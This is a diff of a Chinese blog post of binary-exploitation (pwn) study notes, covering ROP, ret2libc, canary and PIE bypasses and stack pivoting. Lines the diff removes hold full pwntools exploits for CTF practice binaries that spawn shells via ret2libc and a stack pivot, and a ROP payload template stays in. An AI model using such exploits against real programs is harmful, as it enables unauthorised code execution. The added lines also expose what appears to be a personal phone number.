-          <a href="https://www.yuque.com/benjieming-huvhr" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;benjieming-huvhr" rel="noopener" target="_blank">Anza（谢师傅 Pwn大师傅）</a>
+          <a href="https://www.yuque.com/benjieming-huvhr" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;benjieming-huvhr" rel="noopener" target="_blank">Anza（谢师傅 大号在考研）</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://anza2001.github.io/" title="https:&#x2F;&#x2F;anza2001.github.io&#x2F;" rel="noopener" target="_blank">Anza（谢师傅 小号在Pwn）</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jasonttu.github.io/" title="https:&#x2F;&#x2F;jasonttu.github.io&#x2F;" rel="noopener" target="_blank">Jason Tu（hhg 内网肾透）</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/qingguajun" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;qingguajun" rel="noopener" target="_blank">Airtail（黄老板 Go带师）</a>
         </li>
     </ul>
   </div>
@@ -286,7 +277,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwnSkillTree
+          Pwn-TopologyTree
         </h1>
 
         <div class="post-meta-container">
@@ -304,7 +295,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-01-03 00:24:17" itemprop="dateModified" datetime="2022-01-03T00:24:17+08:00">2022-01-03</time>
+        <time title="修改时间：2022-01-07 11:41:12" itemprop="dateModified" datetime="2022-01-07T11:41:12+08:00">2022-01-07</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -330,14 +321,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>8.8k</span>
+      <span>5.9k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -348,12 +339,16 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>怕win11又有bug，所以还是先上传一份笔记，一也是方便查看，二防止到时候又丢了</p>
-<p>因为自己本地一直在更新有什么格式的问题先不纠正了</p>
+        <p>Pwn的学习笔记，格式问题暂时不纠结</p>
 <span id="more"></span>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x101-学习路线"><a href="#0x101-学习路线" class="headerlink" title="0x101 学习路线"></a>0x101 学习路线</h2><h3 id="0x01-汇编语法"><a href="#0x01-汇编语法" class="headerlink" title="0x01 汇编语法"></a>0x01 汇编语法</h3><h4 id="Intel语法和AT-amp-T语法的区别（典型）"><a href="#Intel语法和AT-amp-T语法的区别（典型）" class="headerlink" title="Intel语法和AT&amp;T语法的区别（典型）"></a>Intel语法和AT&amp;T语法的区别（典型）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax 1 ;INTEL</span><br><span class="line">movl $1, %eax //AT&amp;T</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-数据类型"><a href="#0x02-数据类型" class="headerlink" title="0x02 数据类型"></a>0x02 数据类型</h3><p>按字节分的话</p>
+<ul>
+<li>账号：15355430238，Fr.<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/train/course/34?i=2">https://www.ichunqiu.com/train/course/34?i=2</a></li>
+</ul>
+<h1 id="Pwn-Topology-Tree"><a href="#Pwn-Topology-Tree" class="headerlink" title="Pwn Topology Tree"></a>Pwn Topology Tree</h1><h2 id="0x100-Matery-of-Tools"><a href="#0x100-Matery-of-Tools" class="headerlink" title="0x100 Matery of Tools"></a>0x100 Matery of Tools</h2><h3 id="0x01-gdb调试-amp-pwngdb插件"><a href="#0x01-gdb调试-amp-pwngdb插件" class="headerlink" title="0x01 gdb调试 &amp; pwngdb插件"></a>0x01 gdb调试 &amp; pwngdb插件</h3><h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><h3 id="0x03-pwntools"><a href="#0x03-pwntools" class="headerlink" title="0x03 pwntools"></a>0x03 pwntools</h3><h2 id="0x101-Learning-Route"><a href="#0x101-Learning-Route" class="headerlink" title="0x101 Learning Route"></a>0x101 Learning Route</h2><h3 id="0x01-汇编"><a href="#0x01-汇编" class="headerlink" title="0x01 汇编"></a>0x01 汇编</h3><p>Intel和AT&amp;T的典型区别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax 1 ;INTEL</span><br><span class="line">movl $1, %eax //AT&amp;T</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-信息表示与处理"><a href="#0x02-信息表示与处理" class="headerlink" title="0x02 信息表示与处理"></a>0x02 信息表示与处理</h3><p>按字节分</p>
 <ul>
 <li>单字节：字节（Bytes），符</li>
 <li>双字节：词（Word），字</li>
@@ -361,12 +356,11 @@
 <li>八字节：四词（QWorld，quadword）</li>
 <li>16字节：双四词，八词（double quadword）</li>
 </ul>
-<p>对应C语言的数据类型</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210193836184.png" alt="image-20211210193836184"></p>
+<p>对应C语言的数据类型（Fr.《深入理解计算机系统》</p>
+<p><img data-src="G:\4XWi11\source_posts\pwnTree.assets\image-20211218164639699-16398172023881.png" alt="image-20211218164639699"></p>
 <h3 id="0x03-Python"><a href="#0x03-Python" class="headerlink" title="0x03 Python"></a>0x03 Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sn = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s : p.recv(s)</span><br><span class="line">sla = <span class="keyword">lambda</span> r, s : p.sendlineafter(r, s)</span><br><span class="line">sa = <span class="keyword">lambda</span> r, s : p.sendafter(r, s)</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x102-栈溢出"><a href="#0x102-栈溢出" class="headerlink" title="0x102 栈溢出"></a>0x102 栈溢出</h2><p>会用cyclic计算溢出到返回地址的长度</p>
-<h3 id="0x01-ret2shellcode"><a href="#0x01-ret2shellcode" class="headerlink" title="0x01 ret2shellcode"></a>0x01 ret2shellcode</h3><p>特征：栈可执行保护（NX）关闭（内存中有一段rwx的</p>
+<h2 id="0x102-stack-overflow"><a href="#0x102-stack-overflow" class="headerlink" title="0x102 stack overflow"></a>0x102 stack overflow</h2><h3 id="0x00-保护机制"><a href="#0x00-保护机制" class="headerlink" title="0x00 保护机制"></a>0x00 保护机制</h3><h3 id="0x01-ret2shellcode"><a href="#0x01-ret2shellcode" class="headerlink" title="0x01 ret2shellcode"></a>0x01 ret2shellcode</h3><p>特征：栈可执行保护（NX）关闭（内存中有一段rwx的</p>
 <h3 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h3><p>特征：1. 程序存在栈溢出，NX保护开启，其他保护关闭；2. 找得到满足的gadgets</p>
 <p>Return Oriented Programming（返回导向编程），利用程序已有的代码片段（gadgets）来改变某些寄存器或者变量的值，绕过NX保护</p>
 <ul>
@@ -382,7 +376,7 @@
 <p>通过执行gadgets改变寄存器的值然后控制程序执行系统调用</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211122144640565.png" alt="image-20211122144640565"></p>
 <p>EXP：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret =</span><br><span class="line">pop_ebx_ret =</span><br><span class="line">pop_ecx_ret =</span><br><span class="line">pop_edx_ret =</span><br><span class="line">pop_edx_ecx_ebx_ret =</span><br><span class="line">int_0x80 =</span><br><span class="line">bin_sh_addr =</span><br><span class="line">payload = [padding] + p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">		  + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">    	  + p32(int_0x80)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret =</span><br><span class="line">pop_ebx_ret =</span><br><span class="line">pop_ecx_ret =</span><br><span class="line">pop_edx_ret =</span><br><span class="line">pop_edx_ecx_ebx_ret =</span><br><span class="line">int_0x80 =	</span><br><span class="line">bin_sh_addr =</span><br><span class="line">payload = [padding] + p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">		  + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">    	  + p32(int_0x80)</span><br></pre></td></tr></table></figure>
 
 <h4 id="0x3-ret2libc"><a href="#0x3-ret2libc" class="headerlink" title="0x3 ret2libc"></a>0x3 ret2libc</h4><p>基本方法：找到<code>system</code>函数地址，找到<code>/bin/sh</code>字符串地址</p>
 <p>最为常用，执行libc中的函数，通常是返回到某个函数的plt处或者是函数的实际地址</p>
@@ -404,57 +398,16 @@
 <li>没有<code>system</code>和<code>/bin/sh</code>，泄漏<code>system</code>地址</li>
 </ul>
 <p>（通过被使用函数got表中存放的真实地址与libc基址相减，偏移再和<code>system</code>内存地址相加，从而泄漏<code>system</code>真实地址</p>
-<hr>
-<p>之前的ret2text，ret2syscall属于有手就行，也没找到就近的例子，有关于ret2libc的题目，记录一下流程</p>
-<p>先运行试试，让我们输入一个十进制地址，会告诉我们地址中的内容，然后又让我们输入一些东西并返回输入</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124115836772.png" alt="image-20211124115836772"></p>
-<p>例行查看保护，只有NX打开，说明是ROP类型的题目</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124114943675.png" alt="image-20211124114943675"></p>
-<p>在IDA中反编译分析流程</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">10u</span>);</span><br><span class="line">  v8 = strtol(buf, v4, v5);                     <span class="comment">// string_2_long</span></span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">256u</span>);</span><br><span class="line">  Print_message(src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>main函数里不存在栈溢出（不算被调函数内部</p>
-<p>See_something函数返回输入参数地址，和运行尝试一样，可以在不破坏程序的情况下得到一些我们想要的东西</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">See_something</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Print_message函数中有<code>strcpy</code>，而且可以栈溢出，计算需要填充的垃圾数据是60</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于没有使用过<code>system</code>和<code>/bin/sh</code>，所以需要泄漏libc中<code>system</code>和<code>\bin\sh</code>的地址</p>
-<p>进入gdb调试，main函数处下断点，参看plt表有哪些函数，就通过<code>puts</code>来泄漏<code>libc</code>基址吧</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124153136270.png" alt="image-20211124153136270"></p>
-<p>单步直到程序执行过一次<code>puts</code>，查看got表，存放<code>puts</code>函数的got表地址为<code>0x804a01c</code>，而<code>puts</code>在libc中的真实地址为<code>0xf7e42ca0</code></p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124200222364.png" alt="image-20211124200222364"></p>
-<p>查看程序各段的地址和范围，找到<code>libc</code>基址<code>0xf7ddb000</code></p>
-<p>将<code>puts</code>在libc中的真实地址与libc基址相减得到偏移<code>0x67ca0</code>，虽然每次运行libc基址都会改变，但是偏移不变，这样我们就可以每次计算<code>libc</code>基址</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155217765.png" alt="image-20211124155217765"></p>
-<p>同理得到<code>system</code>函数离libc基址的偏移<code>0x3d2e0</code></p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155611802.png" alt="image-20211124155611802"></p>
-<p>到此，根据上面的信息就可以得到libc中<code>system</code>的地址，下面要得到libc中<code>/bin/sh</code>的地址，直接在gdb里search，<code>0xf7f590af</code></p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124164149380.png" alt="image-20211124164149380"></p>
-<p>同样还是算出相对libc的偏移<code>0x17e0af</code></p>
-<p>下面构造payload，由上文注意点中32位的传参机制，我们需要在<code>system_addr</code>和<code>bin_sh_addr</code>中多填充4个字节的垃圾数据</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="built_in">int</span>(<span class="string">&quot;0x804a01c&quot;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Give me an address (in dec) :&quot;</span>, <span class="built_in">str</span>(puts_got))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The content of the address : &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = puts_addr - <span class="number">0x67ca0</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x3d2e0</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x17e0af</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;puts_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;system_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;bin_sh_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">60</span> + p32(system_addr) + <span class="string">b&quot;xxxx&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h5 id="more"><a href="#more" class="headerlink" title="more"></a>more</h5><p>这道题还不够经典，因为它提供了输出程序指定地址的数据，如果将这里也改成可以栈溢出，那么攻击思路就是，第一步通过栈溢出，将返回地址填充为<code>puts_plt</code>，然后调用plt表的函数（runtime_resolve？），后面参数设置为<code>puts_got</code>，如此得到<code>puts</code>在libc中的真实地址，注意32位函数的传参机制，后面的都一样</p>
-<p>exp形如</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = [padding] + p32(puts_plt) + p32(main_addr) + p32(got_plt)</span><br></pre></td></tr></table></figure>
-
-<p>这里返回到主函数地址应该是让程序正常继续运行的地址</p>
-<p>吧？</p>
-<hr>
-<h4 id="0x4-ret2dl"><a href="#0x4-ret2dl" class="headerlink" title="0x4 ret2dl"></a>0x4 ret2dl</h4><hr>
-<p>利用_dl_runtime_resolve函数构造payload，因为该函数是对动态链接的函数进行重定位的</p>
-<p>参考<a href=""></a></p>
-<hr>
+<h4 id="0x4-ret2dl"><a href="#0x4-ret2dl" class="headerlink" title="0x4 ret2dl"></a>0x4 ret2dl</h4><p>利用_dl_runtime_resolve函数构造payload，因为该函数是对动态链接的函数进行重定位的</p>
 <h3 id="0x03-Canary"><a href="#0x03-Canary" class="headerlink" title="0x03 Canary"></a>0x03 Canary</h3><p>特征：打开canary和NX</p>
 <p>绕过方法：</p>
 <ol>
-<li><p>泄漏栈中的canary，参考<a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-canary">https://4xwi11.github.io/posts/a89e21c0/#pwn-canary</a></p>
+<li><p>泄漏栈中的canary</p>
 <ul>
 <li>有合适的输出函数</li>
 <li>泄漏canary后程序不会崩溃</li>
 </ul>
+<p>参考<a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-canary">https://4xwi11.github.io/posts/a89e21c0/#pwn-canary</a></p>
 </li>
 <li><p>爆破canary</p>
 <ul>
@@ -466,7 +419,6 @@
 <p>覆盖TLS中存储的Canary值</p>
 </li>
 </ol>
-<hr>
 <h3 id="0x04-PIE"><a href="#0x04-PIE" class="headerlink" title="0x04  PIE"></a>0x04  PIE</h3><p>特点：开启PIE的程序每次运行时地址的后12位是固定不变的</p>
 <p>绕过方法：</p>
 <ol>
@@ -477,31 +429,7 @@
 </li>
 <li>直接泄漏地址</li>
 </ol>
-<hr>
-<h4 id="Partial-Write"><a href="#Partial-Write" class="headerlink" title="Partial Write"></a>Partial Write</h4><p>这里借用下N^3新生代赛的例题</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100510725.png" alt="image-20211201100510725"></p>
-<p>程序存在栈溢出的地方</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100700020.png" alt="image-20211201100700020"></p>
-<p>并且有后门函数，其偏移是<code>11C0</code></p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100738927.png" alt="image-20211201100738927"></p>
-<p>gdb调试（为啥我的基址不会变？？</p>
-<p>首先确定需要填充24字节的垃圾数据才能覆盖到返回地址</p>
-<p>接着确定程序的基地址，并计算<code>backdoor</code>函数的真实地址</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102209210.png" alt="image-20211201102209210"></p>
-<p>与<code>vul</code>的正常返回地址进行比较（也没看出个啥，还以为是覆盖后3位就好了</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102347265.png" alt="image-20211201102347265"></p>
-<p>或者上面的这些工作直接溢出，然后查看</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102711462.png" alt="image-20211201102711462"></p>
-<p>因为libc地址和基址后3位都是000（Fr. 谢师傅，所以直接覆盖后三位，然后爆破第4位就好了</p>
-<h5 id="栈溢出ROP链打不通"><a href="#栈溢出ROP链打不通" class="headerlink" title="栈溢出ROP链打不通"></a>栈溢出ROP链打不通</h5><p>但是因为libc2.27（ubuntu18）在执行<code>system(&quot;/bin/sh&quot;)</code>的时候比较特殊，有栈不对齐的情况，Fr. <a target="_blank" rel="noopener" href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a>，所以打本地不通，远程由于版本不同就可以</p>
-<p>解决的方法是，略过<code>push rbp</code>，直接来到<code>mov rbp, rsp</code></p>
-<p>（为啥呢，咱也不敢问</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201103754018.png" alt="image-20211201103754018"></p>
-<p>就像有些题payload要多加几个<code>ret</code>一样</p>
-<p>参考</p>
-<p><a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-pie">https://4xwi11.github.io/posts/a89e21c0/#pwn-pie</a></p>
-<h4 id="直接泄漏地址"><a href="#直接泄漏地址" class="headerlink" title="直接泄漏地址"></a>直接泄漏地址</h4><hr>
-<h3 id="0x05-其他溢出"><a href="#0x05-其他溢出" class="headerlink" title="0x05 其他溢出"></a>0x05 其他溢出</h3><h4 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h4><ul>
+<h4 id="Partial-Write"><a href="#Partial-Write" class="headerlink" title="Partial Write"></a>Partial Write</h4><h4 id="直接泄漏地址"><a href="#直接泄漏地址" class="headerlink" title="直接泄漏地址"></a>直接泄漏地址</h4><h3 id="0x05-其他溢出"><a href="#0x05-其他溢出" class="headerlink" title="0x05 其他溢出"></a>0x05 其他溢出</h3><h4 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h4><ul>
 <li>上界溢出</li>
 </ul>
 <p>注意有符号整数和无符号整数</p>
@@ -523,55 +451,54 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">leave;</span><br><span class="line">ret;</span><br><span class="line">;i.e.</span><br><span class="line">mov esp, ebp;</span><br><span class="line">pop ebp;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
 
 <p>总结，也就是说在bss等地方构造ROP链不是通过栈溢出实现的，而跳转到bss段上才是通过栈溢出</p>
-<hr>
-<p>来看这道题</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111545017.png" alt="image-20211210111545017"></p>
-<p><strong>考点：</strong></p>
-<p>32位二次栈迁移</p>
-<p>核心流程如下</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111427708.png" alt="image-20211210111427708"></p>
-<hr>
-<p>查完保护发现只开启了NX，应该是ROP</p>
-<p>用IDA反编译，发现存在后门函数<code>back</code>，以及read栈溢出，但只能溢出6个字节，范围比较小，此外还可以向全局变量all所在的bss段上写东西</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194311462.png" alt="image-20211210194311462"></p>
-<p>典型的栈迁移</p>
-<p>编写exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80485F0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">all_addr = <span class="number">0x804A060</span></span><br><span class="line"></span><br><span class="line">payload = p32(system_plt) + <span class="string">b&quot;aaaa&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * <span class="number">10</span> + p32(all_addr + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="0x103-格式化字符串"><a href="#0x103-格式化字符串" class="headerlink" title="0x103 格式化字符串"></a>0x103 格式化字符串</h2><p>程序代码在输出的时候直接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(value)</span><br></pre></td></tr></table></figure>
 
-<p>攻击失败</p>
-<p><code>vmmap</code>查看发现<code>0x804A060</code>距离<code>0x804A000</code>的距离较近，而<code>0x804A000</code>是不可写，所以程序到这里崩溃了</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194925878.png" alt="image-20211210194925878"></p>
-<p>所以选择二次转移栈将栈迁移到可读可写的内存区</p>
-<p>查看可以改变esp指针的gadget</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210200011410.png" alt="image-20211210200011410"></p>
